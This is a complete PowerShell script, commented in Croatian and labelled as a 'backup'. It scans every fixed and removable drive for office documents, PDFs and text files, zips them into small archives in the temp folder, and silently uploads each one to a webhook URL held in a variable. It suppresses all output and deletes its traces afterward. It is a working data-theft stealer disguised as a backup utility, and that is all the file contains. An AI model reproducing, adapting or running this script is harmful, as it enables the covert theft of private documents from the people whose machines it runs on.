[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Add-Type -AssemblyName System.IO.Compression.FileSystem

$WebhookUrl = $dc # Pretpostavljam da je $dc definirana varijabla s webhook URL-om
$MaxZipSize = 7MB
$OutputPath = "$env:TEMP\BackupDocs"
$Extensions = @("*.doc", "*.docx", "*.xls", "*.xlsx", "*.ppt", "*.pptx", "*.pdf", "*.txt", "*.rtf")
$ExcludedDirs = @("C:\Windows", "C:\Program Files", "C:\Program Files (x86)", "C:\ProgramData")

# Provjera webhook URL-a
if (-not $WebhookUrl) {
    Write-Output "Webhook URL nije definiran!" | Out-Null
    exit
}

# Kreiranje direktorija ako ne postoji
if (-not (Test-Path $OutputPath)) {
    New-Item -ItemType Directory -Path $OutputPath -Force | Out-Null
}

# Pronalazak svih diskova
$Drives = Get-WmiObject Win32_LogicalDisk -Filter "DriveType=2 OR DriveType=3" | Select-Object -ExpandProperty DeviceID
$Files = @()

# Prikupljanje datoteka
foreach ($Drive in $Drives) {
    foreach ($Ext in $Extensions) {
        try {
            $items = Get-ChildItem -Path "$Drive\" -Recurse -Include $Ext -ErrorAction SilentlyContinue -Force |
                Where-Object { -not $_.PSIsContainer -and $ExcludedDirs -notcontains $_.DirectoryName }
            $Files += $items
        } catch {
            Write-Output "Greška pri skeniranju ${Drive} za ${Ext}: $_" | Out-Null
        }
    }
}

$ZipCounter = 1
$CurrentZipSize = 0
$CurrentFiles = @()
$ZipFiles = @()

# Funkcija za kreiranje ZIP datoteke
function Create-ZipFile {
    param($FileList, $ZipPath)
    if (Test-Path $ZipPath) { Remove-Item $ZipPath -Force -ErrorAction SilentlyContinue }
    try {
        $zip = [System.IO.Compression.ZipFile]::Open($ZipPath, 'Create')
        foreach ($f in $FileList) {
            try {
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $f.FullName, $f.Name, [System.IO.Compression.CompressionLevel]::Optimal)
            } catch {
                Write-Output "Greška pri dodavanju ${f}: $_" | Out-Null
            }
        }
        $zip.Dispose()
    } catch {
        Write-Output "Greška pri kreiranju ZIP datoteke ${ZipPath}: $_" | Out-Null
    }
}

# Grupiranje datoteka u ZIP-ove
foreach ($File in $Files) {
    $FileSize = $File.Length
    if ($CurrentZipSize + $FileSize -gt $MaxZipSize -and $CurrentFiles.Count -gt 0) {
        $ZipName = Join-Path $OutputPath "Backup_$ZipCounter.zip"
        Create-ZipFile -FileList $CurrentFiles -ZipPath $ZipName
        $ZipFiles += $ZipName
        $ZipCounter++
        $CurrentZipSize = 0
        $CurrentFiles = @()
    }
    $CurrentFiles += $File
    $CurrentZipSize += $FileSize
}

# Kreiranje posljednje ZIP datoteke ako postoje preostale datoteke
if ($CurrentFiles.Count -gt 0) {
    $ZipName = Join-Path $OutputPath "Backup_$ZipCounter.zip"
    Create-ZipFile -FileList $CurrentFiles -ZipPath $ZipName
    $ZipFiles += $ZipName
}

# Slanje ZIP datoteka na webhook
foreach ($ZipFile in $ZipFiles) {
    if (-not (Test-Path $ZipFile)) { continue }
    if ((Get-Item $ZipFile).Length -gt 8MB) { continue }

    try {
        $FileBytes = [System.IO.File]::ReadAllBytes($ZipFile)
        $FileName = [System.IO.Path]::GetFileName($ZipFile)
        $boundary = [System.Guid]::NewGuid().ToString()
        $bodyLines = @(
            "--$boundary",
            "Content-Disposition: form-data; name=`"file`"; filename=`"$FileName`"",
            "Content-Type: application/octet-stream",
            "",
            [System.Text.Encoding]::GetEncoding("iso-8859-1").GetString($FileBytes),
            "--$boundary--"
        ) -join "`r`n"

        Invoke-WebRequest -Uri $WebhookUrl -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -ErrorAction Stop -TimeoutSec 30
        Write-Output "Poslano: ${ZipFile}" | Out-Null
    } catch {
        Write-Output "Greška pri slanju ${ZipFile}: $_" | Out-Null
    }
}

# Čišćenje i završetak
Remove-Item -Path $OutputPath -Recurse -Force -ErrorAction SilentlyContinue
exit
